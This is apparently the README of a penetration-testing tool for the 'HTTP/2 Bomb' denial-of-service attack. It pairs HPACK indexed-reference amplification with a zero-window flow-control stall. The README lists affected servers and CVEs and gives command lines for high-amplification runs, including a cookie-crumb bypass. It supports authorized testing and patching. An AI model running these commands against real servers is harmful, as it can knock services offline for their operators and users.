# HTTP/2 Bomb Scanner

Authorized pentest tool for detecting and safely testing **HTTP/2 Bomb** (HPACK indexed-reference amplification + flow-control window stall) against targets you own or have written permission to test.

## What it tests

The attack chains two decade-old HTTP/2 abuse patterns:

1. **HPACK indexed-reference bomb** — seed the dynamic table with headers, then emit thousands of 1-byte indexed references. Each reference costs one wire byte but forces the server to allocate full header bookkeeping (70:1 to ~5700:1 depending on server).
2. **HTTP/2 window stall** — advertise a zero-byte flow-control window so responses never complete, pinning allocations until timeout.

## Affected software (default configs)

| Server | CVE | Approx. amplification | Fixed in |
|--------|-----|----------------------|----------|
| Apache httpd mod_http2 | CVE-2026-49975 | ~4000:1 | mod_http2 2.0.41 |
| Envoy | CVE-2026-47774 | ~5700:1 | 1.37.x+ |
| nginx | pending | ~70:1 | 1.29.8 |
| Microsoft IIS | pending | ~68:1 | Windows Server patches |
| Cloudflare Pingora | pending | varies | Pingora updates |

## References

- [SecPod — HTTP/2 Bomb research writeup](https://www.secpod.com/learn/security-research/http-2-bomb-how-an-ai-chained-two-decade-old-techniques-into-a-devastating-remote-do-s)
- [The Hacker News — disclosure](https://thehackernews.com/2026/06/new-http2-bomb-vulnerability-allows.html)
- [Red Hat RHSB-2026-007](https://access.redhat.com/security/vulnerabilities/RHSB-2026-007)
- [CVE-2026-49975 — Apache mod_http2](https://cvefeed.io/vuln/detail/CVE-2026-49975)
- [DEV Community — patch guide](https://dev.to/kkierii/http2-bomb-cve-2026-49975-the-hpack-flow-control-dos-and-how-to-patch-it-26ba)
- [RFC 7541 — HPACK](https://www.rfc-editor.org/rfc/rfc7541)
- [RFC 9113 — HTTP/2](https://www.rfc-editor.org/rfc/rfc9113)
- Prior art: CVE-2016-6581 (classic HPACK bomb), CVE-2025-53020 (Apache cookie merge), CVE-2016-8740 / CVE-2016-1546 (Slowloris variants)

## Install

```bash
cd http2-bomb-scanner
pip install -r requirements.txt
```

## Usage

### Interactive Wizard (Prompt-driven UX)

Launch the interactive prompt wizard by running the tool without arguments or with `-I`:

```bash
python -m http2_bomb
# or
python -m http2_bomb -I
```

The interactive wizard prompts for:
- Target URL
- Action (Test vs. Passive Detection)
- Connections count (`-c`)
- Streams per connection (`-s`)
- HPACK references per stream (`-x`)
- Test / Hold duration (`-l`)
- Connection rate (`-r`)
- Zero-window stall & drip interval (`-i`)
- Cookie crumb bypass (`-k`)
- Pentest authorization confirmation

During test execution, a live `slowhttptest`-style progress console streams status updates every second:

```text
[00:00:05] service: NO DELAY (14.2 ms) | connected: 50/50 | streams: 500 | stalled: 50 | wire: 42.1 KB | errors: 0
[00:00:10] service: HIGH DEGRADATION (920.0 ms) | connected: 50/50 | streams: 500 | stalled: 50 | wire: 42.4 KB | errors: 0
[00:00:15] service: NO RESPONSE (POSSIBLE DOS) | connected: 49/50 | streams: 490 | stalled: 49 | wire: 42.6 KB | errors: 1
```

### Command-Line / Scripting (slowhttptest Style)

**Passive detection only**:

```bash
python -m http2_bomb -u https://target.example -d
python -m http2_bomb -u https://target.example -d --json
```

**Standard verification test** (requires `--confirm`):

```bash
python -m http2_bomb -u https://lab.local -c 50 -s 10 -x 500 -l 30 --confirm
```

**High-amplification test with cookie crumb bypass** (Apache / Envoy profile):

```bash
python -m http2_bomb -u https://lab.local -c 100 -s 20 -x 4000 -l 60 -k --crumb-count 64 -r 25 --confirm
```

**Custom window drip interval & latency probe rate**:

```bash
python -m http2_bomb -u https://lab.local -c 50 -s 10 -x 1000 -l 45 -i 0.5 -p 2.0 --confirm
```

### Options Reference

| Flag | Description | Default |
|------|-------------|---------|
| `-u, --url, --target` | Target URL (e.g. `https://example.com:443/`) | *None* |
| `-c, --connections` | Number of parallel connections | `50` |
| `-s, --streams` | Streams per connection | `10` |
| `-x, --references` | HPACK indexed references per stream | `500` |
| `-l, --duration, --hold-seconds` | Test / window-stall duration in seconds | `30.0` |
| `-i, --interval, --drip-interval`| Interval between 1-byte WINDOW_UPDATE drips | `1.0` |
| `-r, --rate` | Rate of connections established per second | `50.0` |
| `-p, --probe-interval` | Interval between service latency checks | `5.0` |
| `-k, --cookie-crumbs` | Enable Cookie crumb bypass (split RFC 9113 header table) | `False` |
| `--crumb-count` | Number of cookie crumbs to seed | `32` |
| `--no-stall` | Disable zero-window flow control stall | `False` |
| `-t, --timeout` | Socket timeout in seconds | `15.0` |
| `-d, --detect` | Run passive detection / fingerprint only | `False` |
| `-I, --interactive` | Launch interactive prompt wizard | `False` |
| `--confirm` | Required confirmation of pentest authorization | `False` |
| `--json` | Output final result in JSON format | `False` |

## Exit codes

- `0` — completed; target responsive / no degradation (or detect success)
- `1` — target does not support HTTP/2
- `2` — missing `--confirm` authorization or invalid usage
- `3` — service degradation or unresponsiveness observed (vulnerable)

## Legal

**Do not run `test` or `scan --confirm` against systems without explicit authorization.** This tool sends deliberately abusive HTTP/2 frames designed to exhaust server memory.
